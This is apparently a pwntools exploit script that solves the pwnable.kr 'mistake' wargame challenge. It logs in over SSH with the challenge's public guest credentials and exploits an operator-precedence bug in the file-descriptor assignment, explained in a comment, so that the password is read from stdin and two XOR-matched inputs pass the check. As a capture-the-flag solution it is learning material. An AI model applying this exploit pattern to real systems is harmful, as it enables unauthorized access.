from pwn import *

s = ssh(host='pwnable.kr', user='mistake', password='guest', port=2222)
sh = s.process('/bin/sh')

sh.sendline('./mistake')

'''
the mistake is on "if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)"
the priority of "<" is higher than "="
open("/home/mistake/password",O_RDONLY,0400) will return a number large than 0 
so "open("/home/mistake/password",O_RDONLY,0400) < 0" will become 0 and then fd become 0
so read(fd,pw_buf,PW_LEN) is read 10 byte from stdin to pw_buf
'''
sh.sendlineafter('bruteforce...', '1111111111')
sh.sendlineafter('password : ', '0000000000')       # after xor 0000000000 will become 1111111111

sh.interactive()